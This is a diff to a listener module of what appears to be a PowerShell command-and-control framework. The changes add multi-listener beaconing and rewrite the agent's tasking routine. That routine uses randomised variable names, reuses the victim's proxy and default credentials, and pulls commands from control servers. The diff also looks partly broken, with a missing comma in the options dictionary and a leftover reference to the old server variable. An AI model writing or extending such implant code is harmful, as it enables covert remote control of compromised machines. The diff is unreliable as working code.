@@ -82,6 +82,12 @@ class Listener:
                 'Required'      :   False,
                 'Value'         :   '#general'
             }
+            'SupListeners': {
+                'Description'   :   'Names of the other Listeners the agent should beacon back to (eg: listener1,listener2,listener3)',
+                'Required'      :   False,
+                'Value'         :   ''
+            }
+
         }
 
         # required:
@@ -347,15 +353,49 @@ class Listener:
         return ''
 
 
-    def generate_comms(self, listenerOptions, language=None):
+    def generate_comms(self, listenerOptions, language=None, **kwargs):
         """
         Generate just the agent communication code block needed for communications with this listener.
 
         This is so agents can easily be dynamically updated for the new listener.
         """
 
+        #we are generating code for an already deployed agent
+        deployed = "deployed" in kwargs
+
         if language:
             if language.lower() == 'powershell':
+                listener_dict = """
+@{{
+    delay = {delay}
+    name = "{name}"
+    jitter = {jitter}
+    profile= "{profile}"
+    fixed_parameters= @{{
+        headers = @{{UserAgent= "{UA}"
+                     Cookie="{cookie}"}}
+        taskURIs = "{taskURIs}"
+        }}
+    send_func= $script:{send_func}
+    get_task_func= $script:{get_task_func}
+    lostLimit= {lostLimit}
+    missedCheckins={missedCheckins}
+    defaultResponse=[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String("{defaultResponse}"))
+}} 
+#LISTENER_DICT
+""".format(
+           get_task_func = "GetTask{}".format(listenerOptions['Name']['Value']),
+           send_func = "SendMessage{}".format(listenerOptions['Name']['Value']),
+           delay = delay,
+           jitter = jitter,
+           profile = profile,
+           lostLimit = lostLimit,
+           missedCheckins = 0,
+           defaultResponse = b64DefaultResponse,
+           UA = profile.split('|')[1],
+           name = listenerOptions['Name']['Value'],
+           cookie = self.options['Cookie']['Value'],
+           taskURIs = profile.split('|')[0])
 
                 updateServers = """
                     $Script:ControlServers = @("%s");
@@ -363,10 +403,13 @@ class Listener:
                 """ % (listenerOptions['Host']['Value'])
 
                 getTask = """
-                    $script:GetTask = {
+                    $script:GetTask = {{
+                        param($FixedParameters)
+                        $ControlServers = {ControlServers};
+                        $ServerIndex = 0;
 
-                        try {
-                            if ($Script:ControlServers[$Script:ServerIndex].StartsWith("http")) {
+                        try {{
+                            if ($ControlServers[$Script:ServerIndex].StartsWith("http")) {{
 
                                 # meta 'TASKING_REQUEST' : 4
                                 $RoutingPacket = New-RoutingPacket -EncData $Null -Meta 4
@@ -378,24 +421,23 @@ class Listener:
                                 # set the proxy settings for the WC to be the default system settings
                                 $"""+helpers.generate_random_script_var_name("wc")+""".Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
                                 $"""+helpers.generate_random_script_var_name("wc")+""".Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
-                                $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add("User-Agent",$script:UserAgent)
-                                $script:Headers.GetEnumerator() | % {$"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add($_.Name, $_.Value)}
+                                $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add("User-Agent",$FixedParameters["headers"]["UserAgent"])
+                                $FixedParameters["headers"].GetEnumerator() | % {{$"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add($_.Name, $_.Value)}}
                                 $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add("Cookie", "session=$RoutingCookie")
 
                                 # choose a random valid URI for checkin
-                                $taskURI = $script:TaskURIs | Get-Random
+                                $taskURI = $FixedParameters["taskURIs"].Split("{{,}}") | Get-Random
                                 $result = $"""+helpers.generate_random_script_var_name("wc")+""".DownloadData($Script:ControlServers[$Script:ServerIndex] + $taskURI)
                                 $result
-                            }
-                        }
-                        catch [Net.WebException] {
-                            $script:MissedCheckins += 1
-                            if ($_.Exception.GetBaseException().Response.statuscode -eq 401) {
+                            }}
+                        }}
+                        catch [Net.WebException] {{
+                            if ($_.Exception.GetBaseException().Response.statuscode -eq 401) {{
                                 # restart key negotiation
                                 Start-Negotiate -S "$ser" -SK $SK -UA $ua
-                            }
-                        }
-                    }
+                            }}
+                        }}
+                    }}
                 """
 
                 sendMessage = """
